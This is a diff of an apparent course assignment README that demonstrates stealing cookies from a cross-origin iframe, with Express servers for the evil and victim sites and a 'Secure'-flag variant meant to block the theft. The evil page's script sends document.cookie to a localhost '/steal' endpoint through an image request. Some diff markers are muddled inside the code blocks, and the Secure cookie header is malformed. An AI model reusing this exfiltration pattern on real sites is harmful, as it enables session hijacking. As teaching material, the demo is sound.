@@ -275,9 +275,11 @@ if "Iframe not loaded" in outcome:
     
 ### Youtube Video: https://youtu.be/uXC6dfXpam0
 
-### Succesful Attack
+### Setup: Succesful Attack
 
 * HTML
+* 
+Evil HTML running on http://localhost:5001/ has an iframe which contains a HTML file running on http://localhost:5002/. 
 
 ```diff
 $ cat files/html/stolencookie.html 
@@ -285,7 +287,6 @@ $ cat files/html/stolencookie.html
 <title>
 Himarsha's Evil Site
 </title>
-
 
 <h1>Welcome to my evil page! - Successful attack</h1>
 Himarsha Jayanetti, CS595 - Spring 2021, ODU
@@ -310,13 +311,14 @@ The iframe cookie can be displayed outside of iframe. Wait for 5 seconds and you
 -   p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
     document.body.appendChild(p)
 
-    new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
+-   new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
 }, 5000);
 </script>
 
 ```
 
-```javascript
+* Server which hosts the evil site.
+```diff
 $ cat evil_server.js 
 const express = require('express')
 const { createReadStream } = require('fs')
@@ -324,7 +326,7 @@ const app = express()
 const port = 5001
 
 app.get('/', (req, res) => {
-  createReadStream('files/html/stolencookie.html').pipe(res)
+-  createReadStream('files/html/stolencookie.html').pipe(res)
 })
 
 app.listen(port, () => {
@@ -334,7 +336,8 @@ app.listen(port, () => {
 app.use(express.static('files'))
 ```
 
-```javascript
+* Server which hosts the victim site.
+```diff
 $ cat victim.js 
 const express = require('express')
 const { createReadStream } = require('fs')
@@ -342,8 +345,8 @@ const app = express()
 const port = 5002
 
 app.get('/', (req, res) => {
-  res.append('Set-Cookie', 'login=secretcookie; Path=/')
-  res.send("<html><title>Himarsha's Victim Page</title><h1>Welcome to my vulnerable victim page!<br></h1>Himarsha Jayanetti, CS595 - Spring 2021, ODU<br><br>This page will be framed at a cross origin domain.<script>document.write(document.cookie)</script></html>")
+-  res.append('Set-Cookie', 'login=secretcookie; Path=/')
+-  res.send("<html><title>Himarsha's Victim Page</title><h1>Welcome to my vulnerable victim page!<br></h1>Himarsha Jayanetti, CS595 - Spring 2021, ODU<br><br>This page will be framed at a cross origin domain.<script>document.write(document.cookie)</script></html>")
 })
 
 app.listen(port, () => {
@@ -352,7 +355,95 @@ app.listen(port, () => {
 ```
 
 
-### Unsuccesful Attack
+### Setup: Unsuccesful Attack
+
+* HTML
+
+Evil HTML running on http://localhost:5001/ has an iframe which contains a HTML file running on http://localhost:5003/. 
+
+```diff
+$ cat securecookie.html 
+<html>
+<title>
+Himarsha's Evil Site 
+</title>
+
+
+<h1>Welcome to my evil page! - Unsuccessful attack</h1>
+Himarsha Jayanetti, CS595 - Spring 2021, ODU
+<br><br>
+This page is created to demonstrate how to prevent the stealing of cookies from a embedded (inside an iframe) site on another HTML at a cross origin domain.
+<br><br>
+The iframe cookie will not be displayed outside of iframe. Wait for 5 seconds and you will see only the main page cookie appear.
+<p>
+<p>
+
+<script>
+    document.cookie = 'main=cookie'
+    const iframe = document.createElement('iframe')
+-   iframe.src = 'http://localhost:5003/'
+    document.body.appendChild(iframe)
+    document.write(iframe.contentDocument.cookie)
+    console.log(iframe.contentDocument.cookie)
+
+    // wait 5 seconds
+    setTimeout(function() {
+    const p = document.createElement('p')
+-   p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
+    document.body.appendChild(p)
+
+    new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
+}, 5000);
+</script>
+```
+
+* Server which hosts the evil site.
+
+Same server as used in succesfull attack.
+
+* Server which hosts the secure victim site.
+
+This time, we also set "Secure" in the Set-Cookie header.
+
+
+```diff
+$ cat secure.js 
+const express = require('express')
+const { createReadStream } = require('fs')
+const app = express()
+const port = 5003
+
+app.get('/', (req, res) => {
+-  res.append('Set-Cookie', 'login=secretcookie; Path=/, Secure')
+  /*  res.append('X-Frame-Options', 'SAMEORIGIN')*/
+-  res.send("<html><title>Himarsha's Victim Page</title><h1>Welcome to my secure victim page!<br></h1>Himarsha Jayanetti, CS595 - Spring 2021, ODU<br><br>This page will be framed at a cross origin domain.<script>document.write(document.cookie)</script></html>")
+})
+
+app.listen(port, () => {
+  console.log(`Server 3: Secure victim is listening at http://localhost:${port}`)
+})
+```
+
+* In both the cases, document.cookie is used instead of iframe.contentDocument.cookie because iframe.contenDocument gives a null value. If we try to access iframe.contentDocument.cookie it will prompt an error in the console saying "Uncaught TypeError: Cannot read property 'cookie' of null" (refer to the screenshots).
+
+### Screenshots
+
+* Servers running
+<img src="screenshots/servers.png" width="700">
+
+* Succesful attempt of cookie stealing
+<img src="screenshots/stolen1.png" width="700">
+<img src="screenshots/stolen2.png" width="700">
+<img src="screenshots/stolen3.png" width="700">
+
+* Unsuccesful attempt of cookie stealing
+<img src="screenshots/secure1.png" width="700">
+<img src="screenshots/secure2.png" width="700">
+<img src="screenshots/secure3.png" width="700">
+
+
+
+
 
 
 
